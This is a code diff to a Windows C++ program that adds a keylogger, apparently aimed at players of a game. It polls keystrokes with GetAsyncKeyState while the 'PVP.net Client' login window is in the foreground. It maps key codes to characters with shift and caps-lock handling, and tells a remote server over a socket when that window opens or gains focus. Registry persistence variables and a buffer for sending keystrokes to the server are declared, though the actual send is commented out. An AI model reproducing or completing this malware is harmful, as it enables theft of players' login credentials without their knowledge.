@@ -14,16 +14,17 @@
 using namespace std;
 
 //-----Prototypes and global vars
+char getKey(int key); //KeyloggerK
 TCHAR exepath[MAX_PATH]; //Persistence reg variables
 HKEY hKey; //Persistence reg variables
-                ///==Server Commands
+                ///==Protocol
 const char pingbuffer[1] = {00}; // Ping server command
 const char windowbuffer[1] = {01}; //Window open server command
 const char focusbuffer[1] = {02}; //Window open server command
-char sendbuffer[200]; //general buffer for sending to serv
-               ///==Server Commands
-               ///~~Command functions
+char logbuffer[5]; //general buffer for sending keystrokes to serv
+               ///==Protocol
 
+int isCapsLock();
 WSADATA wsaData;
 int iResult; //Validity switch
 sockaddr_in addr;
@@ -152,24 +153,195 @@ goto connect;
 
 return 0;
 }
-
+//====================LOL WINDOW HANDER==========================
 int LoLHandler(SOCKET* sock, HWND hwnd){
+
+
+    printf("LoL Open");
+
 send(*sock,windowbuffer,sizeof(windowbuffer),0);
-while(hwnd = FindWindow( NULL, TEXT("PVP.net Client"))){
-      if(GetFocus()==hwnd){
-       send(*sock,focusbuffer,sizeof(windowbuffer),0);
-      }
+if(GetForegroundWindow() == hwnd){
+        Sleep(500);
+send(*sock,focusbuffer,sizeof(focusbuffer),0);
+printf("LoL Focus");
+}
+while(GetForegroundWindow()==hwnd){
+//send(*sock,focusbuffer,sizeof(focusbuffer),0);
+
+
+        //printf("LoL Focused");
+            //~~~~~~~~~~~~~~~~~~~Keylog loop
+
+            for(int z=8;z<=127;z++){
+
+    if (GetAsyncKeyState(z)== -32767)
+{
+
+if(z != VK_SHIFT && z != VK_CAPITAL) // dont capture caps and shift , its handlded in getKey
+cout << getKey(z);
+}
 
 
 
-                                                    }
+
+// send(*sock,getKey(z),sizeof(focusbuffer),0);
 
 
+                                    }
 
-
+}
 
 
 
 return 0;
+}
+//====================LOL WINDOW HANDER==========================
+
+
+
+
+//====================KEYLOGGER==========================
+
+char getKey(int key){
+
+
+ //~~Special chars!!
+ if (key ==46)
+ return '.';
+ switch (key){
+ case VK_BACK:
+ return '\b';
+ case VK_RETURN:
+return '\n';
+ case VK_SPACE:
+return ' ';
+ case VK_TAB:
+return '\t';
+ case VK_SHIFT:
+    break; //dont display shift as it's handled
+ case VK_CAPITAL:
+    break; // ''
+  case VK_OEM_2:
+      if(GetAsyncKeyState(0x10) & 0x8000) //if shift held
+         return '?';
+      else
+        return '/';
+  case VK_OEM_3:
+       if(GetAsyncKeyState(0x10) & 0x8000)
+         return '~';
+       else
+        return '`';
+ case VK_OEM_4:
+     if(GetAsyncKeyState(0x10) & 0x8000)
+     return '{';
+     else
+        return '[';
+  case VK_OEM_5:
+       if(GetAsyncKeyState(0x10) & 0x8000)
+        return '|';
+       else
+        return '\\';
+  case VK_OEM_6:
+        if(GetAsyncKeyState(0x10) & 0x8000)
+            return '}';
+        else
+            return ']';
+  case VK_OEM_7:
+        if(GetAsyncKeyState(0x10) & 0x8000)
+            return '\"';
+        else
+            return '\'';
+  case 0xBC: //coma
+          if(GetAsyncKeyState(0x10) & 0x8000)
+             return '<';
+          else
+            return ',';
+  case 0xBE:   //period
+         if(GetAsyncKeyState(0x10) & 0x8000)
+             return '>';
+        else
+            return '.';
+  case 0xBA: // semi cole
+       if(GetAsyncKeyState(0x10) & 0x8000)
+            return ':';
+       else
+            return ';';
+ case 0xBD:  // minus
+        if(GetAsyncKeyState(0x10) & 0x8000)
+            return '_';
+        else
+            return '-';
+  case 0xBB: //equals
+       if(GetAsyncKeyState(0x10) & 0x8000)
+         return '+';
+       else
+         return '=';
+ }
+ //~~Special chars!!
+
+
+
+ //~~NUMBERS!!
+ if ((key >= 39) && (key <= 64)) { //ASCII 0-9
+ if (GetAsyncKeyState(0x10) & 0x8000){ //If shift is held down
+        switch (key)
+        {
+             case 0x30:
+                   return ')';
+                case 0x31:
+                    return '!';
+                case 0x32:
+                    return'@';
+
+                case 0x33:
+                 return'#';
+
+                case 0x34:
+                  return '$';
+
+                case 0x35:
+                    return '%';
+
+                case 0x36:
+                   return '^';
+
+                case 0x37:
+                    return '&';
+
+                case 0x38:
+                    return '*';
+
+                case 0x39:
+                   return '(';
+
+        }
+
+
+ }else{
+ return key; //else its a number
+ }
+ }
+  //~~NUMBERS!!
+
+ //~~LETTERS!!
+ else if ((key > 64) && (key < 91))//a-z
+ {
+     if(!(GetAsyncKeyState(0x10)& 0x8000) ^ (isCapsLock())){ //XoR to see if it's a caps + shift combo ....those nested ()'s!!!!!!!
+         key += 32; // uncaps
+     }
+return key; //else its caps
+ //~~LETTERS!!
+
+}
+}
+
+
+
+
+
+//=====================Check caps lock on for keylog=============
+int isCapsLock(void)
+{
+    return (GetKeyState(VK_CAPITAL) & 0x0001);
 }
 
